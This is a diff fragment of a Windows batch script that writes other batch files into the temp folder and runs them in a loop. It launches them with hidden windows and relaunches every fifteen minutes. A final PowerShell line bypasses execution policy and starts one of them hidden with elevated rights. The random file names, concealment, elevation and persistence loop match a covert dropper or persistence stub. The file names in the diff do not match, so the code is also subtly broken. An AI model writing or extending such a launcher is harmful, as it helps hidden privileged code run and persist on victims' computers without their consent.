@@ -129,7 +129,7 @@ echo echo    ) ^>^> pro.bat^ >> nihbtdtdow.bat
 echo echo    goto loop ^>^> pro.bat^ >> nihbtdtdow.bat
 
 echo powershell -c "Start-Process -FilePath "%%temp%%\pro.bat" -WindowStyle Hidden" >> nihbtdtdow.bat
-echo timeout /t 900 /nobreak >nul >> nihbtdtdow.bat
+echo timeout ^/t 900 ^/nobreak ^>nul >> nihbtdtdow.bat
 echo goto loop  >> nihbtdtdow.bat
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process -FilePath '%temp%\nivbtdtdow.bat' -WindowStyle Hidden -Verb RunAs}"
